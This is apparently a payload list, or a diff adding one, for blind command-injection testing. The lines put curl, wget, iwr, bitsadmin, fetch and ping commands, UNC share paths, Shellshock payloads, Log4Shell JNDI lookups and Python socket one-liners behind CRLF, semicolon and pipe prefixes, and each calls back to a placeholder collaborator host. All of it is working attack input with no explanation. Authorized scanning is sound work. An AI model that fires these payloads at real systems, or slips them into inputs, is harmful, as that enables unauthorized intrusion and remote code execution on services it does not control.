+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+%0d%0a() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+%0d%0a${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+%0d%0apython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+%0d%0aimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+;curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+;wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+;iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+;ping !-VARIABLE_COLLABORATOR-!&
+;ping !-VARIABLE_COLLABORATOR-!&&
+;ping !-VARIABLE_COLLABORATOR-!|
+;ping !-VARIABLE_COLLABORATOR-!||
+;ping !-VARIABLE_COLLABORATOR-!;
+;ping !-VARIABLE_COLLABORATOR-!%00
+;ping !-VARIABLE_COLLABORATOR-!#
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+;wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+;iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+;bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+;ping !-VARIABLE_COLLABORATOR-!&
+;ping !-VARIABLE_COLLABORATOR-!&&
+;ping !-VARIABLE_COLLABORATOR-!|
+;ping !-VARIABLE_COLLABORATOR-!||
+;ping !-VARIABLE_COLLABORATOR-!;
+;ping !-VARIABLE_COLLABORATOR-!%00
+;ping !-VARIABLE_COLLABORATOR-!#
+;\\!-VARIABLE_COLLABORATOR-!\share&
+;\\!-VARIABLE_COLLABORATOR-!\share&&
+;\\!-VARIABLE_COLLABORATOR-!\share|
+;\\!-VARIABLE_COLLABORATOR-!\share||
+;\\!-VARIABLE_COLLABORATOR-!\share;
+;\\!-VARIABLE_COLLABORATOR-!\share%00
+;\\!-VARIABLE_COLLABORATOR-!\share#
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+;() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+;() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+;${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+;import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+|curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+|wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+|iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+|fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+|ping !-VARIABLE_COLLABORATOR-!&
+|ping !-VARIABLE_COLLABORATOR-!&&
+|ping !-VARIABLE_COLLABORATOR-!|
+|ping !-VARIABLE_COLLABORATOR-!||
+|ping !-VARIABLE_COLLABORATOR-!;
+|ping !-VARIABLE_COLLABORATOR-!%00
+|ping !-VARIABLE_COLLABORATOR-!#
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+|curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+|wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+|iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+|bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+|fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+|ping !-VARIABLE_COLLABORATOR-!&
+|ping !-VARIABLE_COLLABORATOR-!&&
+|ping !-VARIABLE_COLLABORATOR-!|
+|ping !-VARIABLE_COLLABORATOR-!||
+|ping !-VARIABLE_COLLABORATOR-!;
+|ping !-VARIABLE_COLLABORATOR-!%00
+|ping !-VARIABLE_COLLABORATOR-!#
+|\\!-VARIABLE_COLLABORATOR-!\share&
+|\\!-VARIABLE_COLLABORATOR-!\share&&
+|\\!-VARIABLE_COLLABORATOR-!\share|
+|\\!-VARIABLE_COLLABORATOR-!\share||
+|\\!-VARIABLE_COLLABORATOR-!\share;
+|\\!-VARIABLE_COLLABORATOR-!\share%00
+|\\!-VARIABLE_COLLABORATOR-!\share#
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+|() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+|() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+|${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
